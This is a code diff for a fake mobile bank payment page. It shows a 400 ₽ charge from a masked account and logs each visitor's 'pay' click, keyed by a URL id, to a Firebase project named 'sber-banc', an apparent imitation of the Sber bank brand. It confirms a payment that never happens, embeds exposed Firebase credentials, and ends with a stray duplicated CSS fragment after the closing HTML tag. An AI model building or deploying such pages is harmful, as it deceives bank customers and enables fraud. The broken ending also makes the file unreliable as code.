@@ -8,24 +8,23 @@
   body {
     margin: 0;
     font-family: Arial, sans-serif;
-    background: #000; /* стиль из второго кода */
+    background: #f2f2f2;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
-    color: #00ff00;
   }
   .phone {
     width: 360px;
-    border: 2px solid #0f0;
+    border: 2px solid #ccc;
     border-radius: 25px;
     overflow: hidden;
-    box-shadow: 0 0 25px #0f08;
-    background: #111;
+    box-shadow: 0 0 20px rgba(0,0,0,0.2);
+    background: #fff;
   }
   .header {
-    background: linear-gradient(180deg, #00cc00, #006600);
-    padding: 25px 20px;
+    background: linear-gradient(180deg, #50c878, #a8e6a1);
+    padding: 30px 20px;
     text-align: left;
     color: #fff;
     font-size: 20px;
@@ -35,6 +34,128 @@
     padding: 20px;
   }
   .shop {
+    font-size: 18px;
+    margin-bottom: 10px;
+  }
+  .amount {
+    font-size: 32px;
+    font-weight: bold;
+    margin-bottom: 20px;
+  }
+  .account {
+    border: 1px solid #ddd;
+    border-radius: 12px;
+    padding: 15px;
+    margin-bottom: 20px;
+  }
+  .account span {
+    display: block;
+    font-size: 16px;
+  }
+  .buttons {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+  .btn-pay {
+    background: #0a9e2a;
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    padding: 15px;
+    font-size: 18px;
+    cursor: pointer;
+  }
+  .btn-cancel {
+    background: none;
+    color: #d9534f;
+    border: none;
+    padding: 15px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  .message {
+    margin-top: 15px;
+    font-size: 16px;
+    font-weight: bold;
+    color: green;
+    display: none;
+  }
+</style>
+</head>
+<body>
+<div class="phone">
+  <div class="header">Pay</div>
+  <div class="content">
+    <div class="shop">Магазин</div>
+    <div class="amount">400 ₽</div>
+    <div class="account">
+      <span><b>Счёт списания</b></span>
+      <span>Платёжный счёт ••0000</span>
+      <span style="color:green;font-weight:bold;">100 000 ₽</span>
+    </div>
+    <div class="buttons">
+      <button class="btn-pay" onclick="confirmPayment()">Оплатить 400 ₽</button>
+      <button class="btn-cancel" onclick="exitBrowser()">Отменить</button>
+    </div>
+    <div class="message"></div>
+  </div>
+</div>
+
+<!-- Firebase SDK -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-analytics.js";
+  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+
+  // 🔹 Твой Firebase-конфиг
+  const firebaseConfig = {
+    apiKey: "AIzaSyAqgmvAb-msCN5xsimpXDuAg4FXOBLuEDA",
+    authDomain: "sber-banc.firebaseapp.com",
+    databaseURL: "https://sber-banc-default-rtdb.firebaseio.com",
+    projectId: "sber-banc",
+    storageBucket: "sber-banc.firebasestorage.app",
+    messagingSenderId: "17673551515",
+    appId: "1:17673551515:web:9d400bc82df02c63ed503e"
+  };
+
+  // Инициализация Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const database = getDatabase(app);
+
+  // Получаем ID из URL
+  function getUserID() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get('id');
+  }
+
+  // Подтверждение оплаты
+  window.confirmPayment = async function() {
+    const id = getUserID();
+    if (!id) {
+      alert("ID пользователя не найден!");
+      return;
+    }
+
+    try {
+      await set(ref(database, `${id}/Mobile`), "on");
+      const msg = document.querySelector(".message");
+      msg.textContent = "Оплата подтверждена!";
+      msg.style.display = "block";
+      document.querySelector(".btn-pay").disabled = true;
+    } catch (e) {
+      alert("Ошибка Firebase: " + e);
+    }
+  };
+
+  // Выход
+  window.exitBrowser = function() {
+    window.close();
+  };
+</script>
+</body>
+</html>  .shop {
     font-size: 18px;
     margin-bottom: 10px;
   }
